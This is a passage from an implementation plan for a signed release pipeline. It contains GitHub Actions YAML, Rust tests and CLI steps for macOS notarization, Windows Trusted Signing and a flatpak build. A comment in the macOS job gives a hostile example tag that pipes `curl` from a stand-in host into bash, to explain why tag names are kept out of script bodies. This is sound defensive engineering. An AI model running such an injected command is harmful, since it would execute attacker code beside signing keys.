# Signing, flatpak-builder plus OSTree -- so matrix legs would be a stack of
# `if:` guards. Independent jobs also mean one platform failing does not block
# the others, which matters most for Linux: its flatpak manifest is the least
# proven part of this pipeline.
name: release-apps

on:
  push:
    tags:
      - "app-v*"
  workflow_dispatch:
    inputs:
      platform:
        description: Which platform to build
        type: choice
        default: all
        options: [all, macos, windows, linux]
      version:
        description: Version to stamp when running without a tag (e.g. 1.2.3)
        type: string
        # No default, deliberately. A default that passes the version gate means
        # an operator who clicks Run workflow without editing the field gets a
        # fully signed, notarized DMG named indistinguishably from a genuine
        # release of that version. Make them state it.
        required: true

# Two notarization submissions racing, or two runs both writing the
# `macos-dmg` artifact, is not something to discover on a release. Not
# cancel-in-progress: killing a run mid-notarization leaves an Apple-side
# submission with nothing watching it.
concurrency:
  group: release-apps-${{ github.ref }}
  cancel-in-progress: false

# attestations: write is REQUIRED by actions/attest-build-provenance, and its
# absence fails late and expensively -- the attest step 403s only after the
# full build/sign/notarize/staple, and since upload-artifact runs after it, the
# signed DMG is discarded too.
#
# `contents: read`, not write. Write is what a signing job must not have: no job
# here writes repository contents until the publish job exists, and an unused
# write scope is reachable from every step of a job holding a signing key. But
# read must be stated explicitly rather than left implicit -- checkout of a
# PUBLIC repo succeeds anonymously whatever the token scope, so omitting it
# works today and breaks the day this repo goes private, or the day checkout
# gains `submodules:` or `lfs:` (those hit the contents API, not just the git
# endpoint). A failure coupled to repository visibility is not one to discover
# during a release.
permissions:
  contents: read
  id-token: write
  attestations: write

jobs:
  version:
    name: resolve version
    runs-on: ubuntu-latest
    timeout-minutes: 5
    outputs:
      short: ${{ steps.v.outputs.short }}
      build: ${{ steps.v.outputs.build }}
    steps:
      # No checkout: nothing here reads the repository any more.
      #
      # CFBundleVersion must increase monotonically across releases, and the
      # commit count does NOT satisfy that. It is a property of the branch you
      # tagged, not of time: main at 100 commits, a release branch adds 5 and
      # is tagged (build 105), the branch is squash-merged leaving main at 101,
      # the next tag on main is build 101 -- LOWER than the release before it.
      # macOS and every Sparkle-style comparison then read the newer release as
      # an older build and refuse the upgrade. Any rebase or history rewrite
      # does the same. Measured in this repo on 2026-08-16: this branch 958,
      # origin/main 945, an unrelated stale branch 963.
      #
      # github.run_number is monotonic per THIS WORKFLOW (not per repository --
      # a second release workflow keeps its own counter, which does not perturb
      # this one) and is independent of history shape.
      #
      # It is composed with run_attempt because a re-run REUSES run_number and
      # increments run_attempt instead. Without this, tag app-v1.2.0 running as
      # #57, failing in notarization, and being re-run would produce a second,
      # byte-different DMG also claiming CFBundleVersion 57 -- indistinguishable
      # from the first for any updater that keys on it. Ordering between
      # releases would still hold; build IDENTITY would not.
      #
      # The composition is arithmetic, not string concatenation. Concatenating
      # digits is not monotonic across a digit-count boundary: run 99 attempt 2
      # gives "992" while run 100 attempt 1 gives "1001", which happens to hold,
      # but run 9 attempt 9 gives "99" against run 10 attempt 1's "101" only by
      # luck. run_number * 100 + run_attempt is strictly increasing in
      # run_number and, within a run, in run_attempt.
      #
      # CAVEATS worth knowing rather than rediscovering: the counter resets if
      # the workflow file is renamed, deleted and re-added, or changed enough
      # that GitHub treats it as a new workflow -- never do any of those without
      # adding an offset here. A repository transfer preserves it.
      - id: v
        env:
          # Every one of these crosses into the shell through env, never
          # through ${{ }} interpolation in the script body. A tag name may
          # legally contain ';', '|', '$' and backticks, so interpolating it
          # into a `run:` body is a shell-injection path -- and the job it
          # would execute in holds an unlocked signing keychain and the notary
          # key on disk.
          EVENT_NAME: ${{ github.event_name }}
          REF_NAME: ${{ github.ref_name }}
          INPUT_VERSION: ${{ inputs.version }}
          RUN_NUMBER: ${{ github.run_number }}
          RUN_ATTEMPT: ${{ github.run_attempt }}
        run: |
          set -euo pipefail
          # Discriminate on the EVENT, not the ref type: a workflow_dispatch
          # aimed at a tag ref would otherwise silently ignore the version the
          # operator typed.
          if [ "$EVENT_NAME" = "push" ]; then
            SHORT="${REF_NAME#app-v}"
          else
            SHORT="$INPUT_VERSION"
          fi

          # Validate here, where it costs five seconds, rather than after an
          # hour of notarization. The `app-v*` trigger matches plenty of tags
          # the prefix strip handles badly -- `app-vRC1` yields `RC1`,
          # `app-versioning-notes` yields `ersioning-notes`, and refs may
          # contain slashes, so `app-v1.0/hotfix` would produce a DMG path
          # that does not exist and fail the copy AFTER notarization is paid
          # for. Apple also specifies CFBundleShortVersionString as numeric.
          if ! printf '%s' "$SHORT" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "refusing to release: '$SHORT' is not a three-part numeric version." >&2
            echo "Tags must look like app-v1.2.3; a dispatch must pass the same shape." >&2
            exit 1
          fi

          echo "short=$SHORT" >> "$GITHUB_OUTPUT"
          echo "build=$(( RUN_NUMBER * 100 + RUN_ATTEMPT ))" >> "$GITHUB_OUTPUT"

  macos:
    name: macOS signed DMG
    needs: version
    if: >-
      github.event_name == 'push' ||
      inputs.platform == 'all' || inputs.platform == 'macos'
    runs-on: macos-14
    # This job holds a Developer ID private key. The environment scopes those
    # secrets to release runs and gives the signing path a place to hang
    # required reviewers, matching how the Windows job is gated.
    environment: release
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master@2026-05-27
      # No build cache in a release job, deliberately. A cache is a
      # write-target a lower-privilege job can poison, and this job holds
      # signing authority. The cold-build cost is the price of that.

      - name: Build the FFI dylib
        run: cargo build --release -p trace-commons-contributor-ffi

      # make-release-dmg.sh refuses outright when any credential is missing,
      # rather than falling back to an ad-hoc signature. An unsigned artifact
      # named like a release is worse than no artifact.
      # The version crosses into the shell through env, NEVER through ${{ }}
      # interpolation in the script body. GitHub substitutes an interpolation
      # textually before bash sees it, and this job is the worst possible place
      # for that: it holds an unlocked signing keychain and the notary key on
      # disk. The version derives from a tag name, and refs legally contain
      # ';', '|', '$', backticks and quotes -- only space, '~', '^', ':', '?',
      # '*', '[' and '\' are barred -- so a tag named
      # `app-v1.0.0;curl -s evil.sh|bash` would run attacker code beside the
      # signing key. The version job's regex gate is the primary defence; this
      # is the one that does not depend on the gate being right.
      - name: Build, sign, notarize and staple
        env:
          SHORT_VERSION: ${{ needs.version.outputs.short }}
          BUILD_VERSION: ${{ needs.version.outputs.build }}
          MACOS_CERTIFICATE_P12_BASE64: ${{ secrets.MACOS_CERTIFICATE_P12_BASE64 }}
          MACOS_CERTIFICATE_PASSWORD: ${{ secrets.MACOS_CERTIFICATE_PASSWORD }}
          MACOS_SIGNING_IDENTITY: ${{ secrets.MACOS_SIGNING_IDENTITY }}
          MACOS_NOTARY_ASC_KEY_P8_BASE64: ${{ secrets.MACOS_NOTARY_ASC_KEY_P8_BASE64 }}
          MACOS_NOTARY_ASC_KEY_ID: ${{ secrets.MACOS_NOTARY_ASC_KEY_ID }}
          MACOS_NOTARY_ASC_ISSUER_ID: ${{ secrets.MACOS_NOTARY_ASC_ISSUER_ID }}
        run: |
          ./macos/scripts/make-release-dmg.sh "$SHORT_VERSION" "$BUILD_VERSION"

      - name: Rename and checksum
        env:
          SHORT_VERSION: ${{ needs.version.outputs.short }}
        run: |
          set -euo pipefail
          mkdir -p dist
          OUT="TraceCommons-${SHORT_VERSION}.dmg"
          cp macos/.build/TraceCommons.dmg "dist/$OUT"
          # The DMG is signed, notarized and stapled by this point, so this
          # checksum already covers the final bytes -- unlike the Windows and
          # CLI paths, where signing happens after packaging and the checksum
          # must be recomputed.
          ( cd dist && shasum -a 256 "$OUT" > "$OUT.sha256" )

      # After signing and stapling, so the provenance covers the bytes a
      # contributor actually downloads. The .sha256 is attested too: it is
      # published beside the DMG as an integrity claim, and an unattested
      # checksum file could be swapped independently of the artifact it
      # describes.
      - uses: actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4
        with:
          subject-path: |
            dist/*.dmg
            dist/*.dmg.sha256

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: macos-dmg
          path: dist/
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: still FAIL — `windows:` and `linux-flatpak:` jobs do not exist yet. Add placeholders that do nothing but satisfy the shape? **No.** Instead, temporarily narrow the test to `["  macos:"]`, and restore the full list in Task 7 and Task 8. Note the narrowing in the commit message so it is not mistaken for the final assertion.

Run again after narrowing.
Expected: PASS.

- [ ] **Step 5: Lint the workflow**

Run: `actionlint .github/workflows/release-apps.yml`
Expected: clean. If `actionlint` is unavailable, run `python3 -c "import yaml,sys; yaml.safe_load(open('.github/workflows/release-apps.yml'))"` and say which check you ran.

- [ ] **Step 6: Commit and push so the workflow is dispatchable**

```bash
git add .github/workflows/release-apps.yml \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Add the macOS signed-DMG release job

The job assertion is narrowed to macos: for now; Tasks 7 and 8 restore the
windows and linux-flatpak legs."
git push -u origin signed-app-distribution-spec
```

- [ ] **Step 7: Produce a real signed DMG**

```bash
gh workflow run release-apps.yml --repo TraceCommons/trace-commons-server \
  --ref signed-app-distribution-spec \
  -f platform=macos -f version=0.0.0
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: green, with the `spctl --assess` step in the script's output showing `accepted` and `source=Notarized Developer ID`. Paste that. This is the first time anything in this repo has been notarized — if it fails, the failure is the finding, and Apple's rejection log (`notarytool log`) goes in the report.

- [ ] **Step 8: The clean-machine gate**

Download the artifact, move it to a Mac that did not build it, **turn the network off**, and open it.

Expected: mounts and launches with no Gatekeeper prompt. Offline is the whole point — it is what distinguishes a stapled ticket from one that happens to resolve against Apple over the network. Record the macOS version tested.

- [ ] **Step 9: Write `docs/release-runbook.md`**

Document: the tag format, the six macOS secrets and where the key lives, the clean-machine gate and why offline, and that `3K939H4WUQ` should be revoked via `asc certificates revoke --id 3K939H4WUQ --confirm` now that a verified DMG exists. Include the actual `spctl` output from Step 7 as the evidence that the path works.

- [ ] **Step 10: Commit**

```bash
git add docs/release-runbook.md
git commit -m "Record the macOS release gates and the notarization evidence"
```

---

### Task 6: Azure OIDC for Trusted Signing

Give GitHub Actions keyless access to certificate profile `argos`. Credential operations; verification is a real signature in Task 7.

**Files:** none in-repo. Produces an Azure app registration, a role assignment, a GitHub environment, and three non-secret variables.

**Interfaces:**
- Produces: repository secrets `AZURE_CLIENT_ID`, `AZURE_TENANT_ID`, `AZURE_SUBSCRIPTION_ID`, and a GitHub environment named `release`.

- [ ] **Step 1: Confirm the signing target still exists**

```bash
az trustedsigning show --name argossigning --resource-group argos-signing -o json
az trustedsigning certificate-profile show --account-name argossigning \
  --resource-group argos-signing --name argos -o json
```

Expected: account `provisioningState: Succeeded`; profile `status: Active`. Record the `accountUri` — it must equal `https://eus.codesigning.azure.net/`.

- [ ] **Step 2: Create the app registration and service principal**

```bash
APP_ID="$(az ad app create --display-name trace-commons-release --query appId -o tsv)"
az ad sp create --id "$APP_ID"
echo "$APP_ID"
```

- [ ] **Step 3: Grant the signer role, scoped to the profile**

```bash
az role assignment create \
  --assignee "$APP_ID" \
  --role "Artifact Signing Certificate Profile Signer" \
  --scope "/subscriptions/cd8568f1-be90-45d3-8bdf-65b2c3f09ad2/resourceGroups/argos-signing/providers/Microsoft.CodeSigning/codeSigningAccounts/argossigning/certificateProfiles/argos"
az role assignment list --assignee "$APP_ID" -o table
```

Scoped to the profile, not the subscription: this principal should be able to sign with `argos` and do nothing else in the subscription.

The role is **`Artifact Signing`**, not `Trusted Signing` — Microsoft renamed the product, and the old name fails with `Role '...' doesn't exist.` Verified against `az role definition list` in this tenant on 2026-08-16. If a future CLI renames it again, find the current name with:

```bash
az role definition list --query "[?contains(roleName,'Signing')].roleName" -o tsv
```

- [ ] **Step 4: Create the GitHub environment**

In repository settings, create an environment named `release`. Federated credential subjects do not support wildcards for tag refs, so a per-tag subject would need a new credential for every release. An environment subject is stable across tags and also gives the release jobs a place to hang required reviewers later.

- [ ] **Step 5: Add the federated credential**

```bash
az ad app federated-credential create --id "$APP_ID" --parameters '{
  "name": "github-release-env",
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:TraceCommons/trace-commons-server:environment:release",
  "audiences": ["api://AzureADTokenExchange"]
}'
az ad app federated-credential list --id "$APP_ID" -o table
```

- [ ] **Step 6: Load the identifiers**

```bash
gh secret set AZURE_CLIENT_ID --repo TraceCommons/trace-commons-server --body "$APP_ID"
gh secret set AZURE_TENANT_ID --repo TraceCommons/trace-commons-server \
  --body "48d94944-6c6f-4b98-b307-f06351bef9d5"
gh secret set AZURE_SUBSCRIPTION_ID --repo TraceCommons/trace-commons-server \
  --body "cd8568f1-be90-45d3-8bdf-65b2c3f09ad2"
```

These are identifiers, not key material — no signing key ever reaches GitHub on this platform. They are stored as secrets only to keep the tenant and subscription out of public logs.

---

### Task 7: The Windows job, timestamped

**Files:**
- Modify: `.github/workflows/release-apps.yml` (add the `windows` job; restore the job assertion)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: Task 6's secrets and the `release` environment; `needs.version.outputs.short`.
- Produces: artifact `windows-zip` containing signed `trace-commons-contributor.exe` and the daemon binary.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn windows_signing_is_timestamped() {
    let workflow = read(".github/workflows/release-apps.yml");
    // Microsoft's dlib driven by signtool, NOT the marketplace action -- so the
    // client can be verified by content before it runs in a job that holds
    // signing authority.
    assert!(
        workflow.contains("Azure.CodeSigning.Dlib.dll"),
        "Windows signing drives Microsoft's Trusted Signing dlib via signtool"
    );
    assert!(
        !workflow.contains("azure/trusted-signing-action"),
        "the marketplace action was deliberately replaced by the SHA-verified \
         dlib; reintroducing it drops the content check"
    );
    assert!(
        workflow.contains("TRUSTED_SIGNING_CLIENT_SHA256")
            && workflow.contains("Refusing to expand a potentially tampered"),
        "the signing client must be verified by SHA-256 and fail closed before \
         extraction"
    );
    // Trusted Signing certificates are valid for roughly three days. Without
    // an RFC3161 countersignature the signature stops validating days after
    // release -- a failure no same-day test would catch.
    // Assert on the FLAGS, not on a word that could sit in a comment. The
    // marketplace action took a `timestamp-rfc3161` input; signtool takes /tr
    // and /td, so a test matching the old input name guards nothing and tempts
    // whoever sees it fail into inserting the token into prose.
    assert!(
        workflow.contains("/tr http://timestamp.acs.microsoft.com"),
        "every sign invocation needs an RFC3161 timestamp server: Trusted \
         Signing certificates carry ~3-day validity, so the countersignature \
         is the only reason a signature outlives them"
    );
    assert!(
        workflow.contains("/td SHA256"),
        "the timestamp digest algorithm must be pinned alongside /tr"
    );
    assert!(
        workflow.contains("signtool") || workflow.contains("Get-AuthenticodeSignature"),
        "the signature must be verified in the job, not assumed"
    );
}
```

Restore the narrowed assertion from Task 5 Step 4 to include `"  windows:"`.

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL on `windows_signing_is_timestamped` and on the restored job list.

- [ ] **Step 3: Add the `windows` job**

Append to `.github/workflows/release-apps.yml`:

```yaml
  windows:
    name: Windows signed binaries
    needs: version
    if: >-
      github.event_name == 'push' ||
      inputs.platform == 'all' || inputs.platform == 'windows'
    runs-on: windows-latest
    # The federated credential's subject is
    # repo:...:environment:release, so this job must declare the environment
    # or the OIDC token will not match and signing fails at auth.
    environment: release
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4
      - uses: dtolnay/rust-toolchain@3c5f7ea28cd621ae0bf5283f0e981fb97b8a7af9 # master@2026-05-27
        with:
          targets: x86_64-pc-windows-msvc
      # No build cache in a release job, deliberately. A cache is a
      # write-target a lower-privilege job can poison, and this job holds
      # signing authority. The cold-build cost is the price of that.

      # By NAME, not by package. `-p trace-commons-contributor` also builds
      # win-pipe-acl-probe, whose own doc comment says it is a test tool and not
      # a contributor-facing command. A `*.exe` glob downstream would then hand
      # it a public-trust Authenticode signature, attest it, and ship it in the
      # release archive -- widening what that certificate has vouched for, for
      # no benefit, and putting a binary in contributors' hands that nobody
      # should run. There is no separate daemon binary; the CLI is the whole
      # Windows deliverable today.
      - name: Build the CLI
        run: cargo build --release --bin trace-commons-contributor -p trace-commons-contributor --target x86_64-pc-windows-msvc

      - name: Stage the binary for signing
        shell: pwsh
        run: |
          $ErrorActionPreference = "Stop"
          New-Item -ItemType Directory -Force -Path signed | Out-Null
          Copy-Item target/x86_64-pc-windows-msvc/release/trace-commons-contributor.exe signed/
          # Assert the exact expected set, so neither a new binary appearing in
          # the package nor a copy that silently matched nothing can reach the
          # signing step. "Signed nothing" must be a failure, not a green job.
          $staged = @(Get-ChildItem signed\*.exe)
          if ($staged.Count -ne 1) {
            throw "expected exactly 1 binary staged for signing, found $($staged.Count): $($staged.Name -join ', ')"
          }

      - uses: azure/login@a457da9ea143d694b1b9c7c869ebb04ebe844ef5 # v2
        with:
          client-id: ${{ vars.AZURE_SIGNING_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_SIGNING_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SIGNING_SUBSCRIPTION_ID }}

      # No signing key reaches this runner: Trusted Signing issues a
      # short-lived certificate against the OIDC token above, and the dlib
      # authenticates through DefaultAzureCredential picking up that session.
      #
      # Microsoft's client is fetched rather than vendored, so it is verified by
      # content before anything is extracted or executed. This job holds signing
      # authority; a tampered download here would sign whatever an attacker
      # liked with a public-trust certificate.
      - name: Set up Trusted Signing (SHA-verified dlib + signtool)
        id: ts
        shell: pwsh
        env:
          TS_ENDPOINT: ${{ vars.AZURE_SIGNING_ENDPOINT }}
          TS_ACCOUNT: ${{ vars.AZURE_SIGNING_ACCOUNT }}
          TS_PROFILE: ${{ vars.AZURE_SIGNING_PROFILE }}
          # Independently verified 2026-08-16 by downloading the package and
          # hashing it. When bumping $nugetVersion, re-derive this from a
          # trusted machine -- do not copy a hash from anywhere.
          TRUSTED_SIGNING_CLIENT_SHA256: 3BFCF1E0A3CB42AF1692F0A8ED45C15DE070C2DE86F28A59B2795D904D8A920F
        run: |
          $ErrorActionPreference = "Stop"
          $nugetVersion = "1.0.95"
          $pkgZip = Join-Path $env:RUNNER_TEMP "mtsc.zip"
          $pkgDir = Join-Path $env:RUNNER_TEMP "mtsc"
          Invoke-WebRequest -UseBasicParsing `
            -Uri "https://www.nuget.org/api/v2/package/Microsoft.Trusted.Signing.Client/$nugetVersion" `
            -OutFile $pkgZip

          $expected = $env:TRUSTED_SIGNING_CLIENT_SHA256
          $actual = (Get-FileHash -Path $pkgZip -Algorithm SHA256).Hash
          Write-Host "Microsoft.Trusted.Signing.Client $nugetVersion SHA-256: $actual"
          if ([string]::IsNullOrWhiteSpace($expected)) {
            throw "TRUSTED_SIGNING_CLIENT_SHA256 is not set (observed: $actual). Refusing to extract an unverified signing package."
          }
          if ($actual -ne $expected.Trim().ToUpperInvariant()) {
            throw "Hash mismatch for Microsoft.Trusted.Signing.Client $nugetVersion. Expected $($expected.Trim().ToUpperInvariant()), got $actual. Refusing to expand a potentially tampered signing package."
          }

          Expand-Archive -Path $pkgZip -DestinationPath $pkgDir -Force
          $dlib = Join-Path $pkgDir "bin\x64\Azure.CodeSigning.Dlib.dll"
          if (-not (Test-Path $dlib)) {
            $dlib = (Get-ChildItem -Path $pkgDir -Recurse -Filter "Azure.CodeSigning.Dlib.dll" |
                     Select-Object -First 1 -ExpandProperty FullName)
          }
          if (-not $dlib) { throw "Azure.CodeSigning.Dlib.dll not found in package" }

          $metadata = Join-Path $env:RUNNER_TEMP "ts-metadata.json"
          [ordered]@{
            Endpoint               = $env:TS_ENDPOINT
            CodeSigningAccountName = $env:TS_ACCOUNT
            CertificateProfileName = $env:TS_PROFILE
          } | ConvertTo-Json | Out-File -FilePath $metadata -Encoding utf8

          # -ErrorAction SilentlyContinue so the friendly throw below is
          # actually reachable: under $ErrorActionPreference = "Stop", a missing
          # Windows Kits directory (image change, SDK relocation) raises a
          # terminating ItemNotFoundException here and the operator sees a path
          # error instead of the message written for them.
          #
          # Sorted as a [version], not as a string: a lexicographic sort over
          # SDK directory names happens to pick correctly today but breaks the
          # moment a 10.0.9xxxx-style entry appears beside a 10.0.2xxxx one.
          $signtool = (Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" `
                         -ErrorAction SilentlyContinue |
                       Sort-Object { [version]$_.Directory.Parent.Name } -Descending |
                       Select-Object -First 1 -ExpandProperty FullName)
          if (-not $signtool) { throw "signtool.exe not found in Windows SDK" }

          "dlib=$dlib"         >> $env:GITHUB_OUTPUT
          "metadata=$metadata" >> $env:GITHUB_OUTPUT
          "signtool=$signtool" >> $env:GITHUB_OUTPUT

      # /tr plus /td is the RFC3161 countersignature. It is not optional here:
      # Trusted Signing certificates carry roughly three-day validity, and the
      # timestamp is the only reason a signature outlives them. An untimestamped
      # binary starts failing validation days after release -- a failure no
      # same-day test would catch.
      - name: Sign
        shell: pwsh
        run: |
          $ErrorActionPreference = "Stop"
          Get-ChildItem signed\*.exe | ForEach-Object {
            & "${{ steps.ts.outputs.signtool }}" sign /v /fd SHA256 `
              /tr http://timestamp.acs.microsoft.com /td SHA256 `
              /dlib "${{ steps.ts.outputs.dlib }}" `
              /dmdf "${{ steps.ts.outputs.metadata }}" `
              $_.FullName
            if ($LASTEXITCODE -ne 0) { throw "signing failed for $($_.Name)" }
          }

      # The real check: what a verifier says, not what the signing step
      # reported. /pa uses the Authenticode policy an end user's machine uses.
      # The real check: what a verifier says, not what the signing step
      # reported. /pa uses the Authenticode policy an end user's machine uses.
      - name: Verify the signatures
        shell: pwsh
        run: |
          $ErrorActionPreference = "Stop"
          Get-ChildItem signed\*.exe | ForEach-Object {
            & "${{ steps.ts.outputs.signtool }}" verify /pa /v $_.FullName
            if ($LASTEXITCODE -ne 0) { throw "signature verification failed for $($_.Name)" }
          }

      # After signing, so the provenance covers the signed bytes rather than the
      # unsigned build output.
      # Deliberately narrower than the macOS job, which attests its DMG and the
      # DMG's checksum. Here the Authenticode signature travels inside the .exe
      # itself, so provenance on the exe covers what a contributor executes; the
      # zip is only a transport. If that reasoning ever stops holding -- an
      # installer that is itself the executed artifact, say -- attest the
      # package too.
      - uses: actions/attest-build-provenance@a2bbfa25375fe432b6a289bc6b6cd05ecd0c4c32 # v4
        with:
          subject-path: signed/*.exe

      - name: Package
        shell: pwsh
        env:
          SHORT_VERSION: ${{ needs.version.outputs.short }}
        run: |
          $ErrorActionPreference = "Stop"
          # Compress-Archive does NOT create a missing parent for
          # -DestinationPath; it throws DirectoryNotFoundException. Omitting
          # this fails after the cold build, after signing, and after a
          # certificate has already been issued and consumed.
          New-Item -ItemType Directory -Force -Path dist | Out-Null
          $v = $env:SHORT_VERSION
          $zip = "dist\trace-commons-windows-x86_64-$v.zip"
          Compress-Archive -Path signed\*.exe -DestinationPath $zip
          # Same sidecar format as the macOS path -- "<lowercase hash>  <name>",
          # which `sha256sum -c` accepts. A bare uppercase hash with no filename
          # cannot be verified that way, and this repo already ships a consumer
          # that uses `sha256sum -c` (deploy/pilot-gcp/pull-and-install.sh).
          $hash = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLowerInvariant()
          "$hash  $(Split-Path -Leaf $zip)" |
            Out-File "$zip.sha256" -Encoding ascii -NoNewline

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: windows-zip
          path: dist/
```

- [ ] **Step 4: Run the tests to verify they pass**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS.

Run: `actionlint .github/workflows/release-apps.yml`
Expected: clean.

- [ ] **Step 5: Commit, push, and produce a real signed binary**

```bash
git add .github/workflows/release-apps.yml \
  crates/trace-commons-contributor/tests/release_pipeline.rs
git commit -m "Sign the Windows binaries with Azure Trusted Signing"
git push
gh workflow run release-apps.yml --repo TraceCommons/trace-commons-server \
  --ref signed-app-distribution-spec \
  -f platform=windows -f version=0.0.0
gh run watch --repo TraceCommons/trace-commons-server
```

Expected: green, with `signtool verify /pa` reporting `Successfully verified`. Paste it. An auth failure here means the federated-credential subject does not match the job's `environment:` — check both before touching anything else.

- [ ] **Step 6: Record the delayed check**

The signature's survival past the certificate's validity window cannot be tested on release day. Add to `docs/release-runbook.md` a dated entry: re-run `signtool verify /pa` on the archived zip at least four days after this run, and record the result. Commit that entry now so the check is owed rather than remembered.

```bash
git add docs/release-runbook.md
git commit -m "Owe a post-expiry signature check on the Windows artifact"
```

---

### Task 8: Build the flatpak at all

The manifest is honest about being unbuilt: `cargo-sources.json` does not exist, and its `sources` entry is disabled with `only-arches: []`. Generate that file and get a flatpak to build in CI. This is the highest-discovery-risk task in the plan.

**Files:**
- Create: `crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json` (generated, committed)
- Modify: `crates/trace-commons-contributor-gtk/flatpak/ai.tracecommons.Contributor.yml` (enable the sources entry; drop the "UNBUILT" caveat only once it builds)
- Modify: `.github/workflows/release-apps.yml` (add `linux-flatpak`; restore the job assertion)
- Test: `crates/trace-commons-contributor/tests/release_pipeline.rs`

**Interfaces:**
- Consumes: `needs.version.outputs.short`.
- Produces: artifact `flatpak-repo` containing an unsigned OSTree repo; `linux-flatpak` job.

- [ ] **Step 1: Write the failing test**

Append to `crates/trace-commons-contributor/tests/release_pipeline.rs`:

```rust
#[test]
fn flatpak_manifest_has_its_vendored_sources_enabled() {
    let manifest = read("crates/trace-commons-contributor-gtk/flatpak/ai.tracecommons.Contributor.yml");
    assert!(
        !manifest.contains("only-arches: []"),
        "the cargo-sources.json entry is still disabled, so the \
         network-sandboxed cargo build cannot resolve any crate"
    );
    let sources = repo_root()
        .join("crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json");
    assert!(
        sources.exists(),
        "cargo-sources.json must be generated and committed; \
         `cargo --offline build` has no crates without it"
    );
    // The confinement argument only holds if the grants stay narrow.
    assert!(
        manifest.contains("--filesystem=~/.claude/projects:ro")
            && manifest.contains("--filesystem=~/.codex/sessions:ro"),
        "the two read-only session roots must remain the only filesystem grants"
    );
    assert!(
        !manifest.contains("--filesystem=home"),
        "a blanket home grant defeats the point of shipping this confined"
    );
}
```

Restore the job-list assertion to include `"  linux-flatpak:"`.

- [ ] **Step 2: Run the test to verify it fails**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: FAIL — `only-arches: []` is present and `cargo-sources.json` is missing.

- [ ] **Step 3: Generate `cargo-sources.json`**

The generator needs network access to resolve checksums and is not vendored here.

```bash
cd ~/code/trace-commons-server
curl -fsSLO https://raw.githubusercontent.com/flatpak/flatpak-builder-tools/master/cargo/flatpak-cargo-generator.py
python3 -m venv /tmp/fcg && /tmp/fcg/bin/pip install aiohttp toml
/tmp/fcg/bin/python flatpak-cargo-generator.py \
  crates/trace-commons-contributor-gtk/Cargo.lock \
  -o crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json
rm flatpak-cargo-generator.py
python3 -c "import json;d=json.load(open('crates/trace-commons-contributor-gtk/flatpak/cargo-sources.json'));print(len(d),'sources')"
```

Expected: a source count in the hundreds. Paste it. Do not hand-write this file — a plausible-looking one pins wrong checksums, which the manifest's own comment already warns about.

- [ ] **Step 4: Enable the sources entry**

In the manifest's `sources:`, replace:

```yaml
      - type: file
        path: cargo-sources.json
        only-arches: []  # disabled until cargo-sources.json exists; see above
```

with:

```yaml
      - cargo-sources.json
```

An `include`-style bare filename is how flatpak-builder expects a generated source list to be spliced in; a `type: file` entry would copy the JSON into the build rather than treat its contents as sources.

- [ ] **Step 5: Add the `linux-flatpak` job**

Append to `.github/workflows/release-apps.yml`:

```yaml
  linux-flatpak:
    name: Linux flatpak
    needs: version
    if: >-
      github.event_name == 'push' ||
      inputs.platform == 'all' || inputs.platform == 'linux'
    runs-on: ubuntu-latest
    # Signing authority, so it declares the environment like the other two:
    # this job imports the OSTree repo's GPG private key from Secret Manager.
    # Its GCP auth is repository-scoped rather than environment-scoped, so
    # unlike the Windows job this is protection rather than a hard auth
    # requirement -- but a job holding a signing key is gated either way.
    environment: release
    # This manifest had never been built when the job was written. The
    # generous timeout is because a from-scratch flatpak build compiles the
    # whole GTK crate against the GNOME SDK with no cargo cache.
    timeout-minutes: 90
    steps:
      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4

      - name: Install flatpak and the GNOME SDK
        run: |
          set -euo pipefail
          sudo apt-get update
          sudo apt-get install -y flatpak flatpak-builder
          sudo flatpak remote-add --if-not-exists flathub \
            https://dl.flathub.org/repo/flathub.flatpakrepo
          sudo flatpak install -y --noninteractive flathub \
            org.gnome.Platform//46 org.gnome.Sdk//46 \
            org.freedesktop.Sdk.Extension.rust-stable//24.08

      - name: Build the flatpak into a local repo
        run: |
          set -euo pipefail
          sudo flatpak-builder --disable-rofiles-fuse --force-clean \
            --repo=flatpak-repo build-dir \
            crates/trace-commons-contributor-gtk/flatpak/ai.tracecommons.Contributor.yml
          sudo chown -R "$USER" flatpak-repo

      - name: Confirm the app is actually in the repo
        run: |
          set -euo pipefail
          ostree --repo=flatpak-repo refs | tee refs.txt
          grep -q 'app/ai.tracecommons.Contributor/' refs.txt

      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4
        with:
          name: flatpak-repo
          path: flatpak-repo/
```

- [ ] **Step 6: Run the tests and lint**

Run: `cargo test -p trace-commons-contributor --test release_pipeline`
Expected: PASS.

Run: `actionlint .github/workflows/release-apps.yml`
Expected: clean.

- [ ] **Step 7: Commit, push, and find out whether it builds**

```bash
